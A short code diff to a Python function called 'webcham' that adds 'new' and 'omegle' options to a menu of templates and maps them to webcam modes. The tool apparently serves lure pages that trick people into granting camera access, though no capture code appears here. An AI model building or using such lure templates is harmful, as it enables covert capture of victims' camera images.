@@ -29,7 +29,9 @@ def webcham():
 
       [1] Deafult
       [2] Mobile Camera
-      [3] Avatar X-Men \n""")
+      [3] Avatar X-Men
+      [4] new 
+      [5] omegle \n""")
       print(template_list)
       print(Fore.RED+" [!] "+Fore.GREEN+"Please Enter The Template\n")
 
@@ -49,6 +51,12 @@ def webcham():
 
       elif input1 == "3":
         webcam_mode = "xmen_temp"
+
+      elif input1 == "4":
+        webcam_mode = "ops"
+
+      elif input1 == "5":
+        webcam_mode = "omege"
         
   except:
       print("")
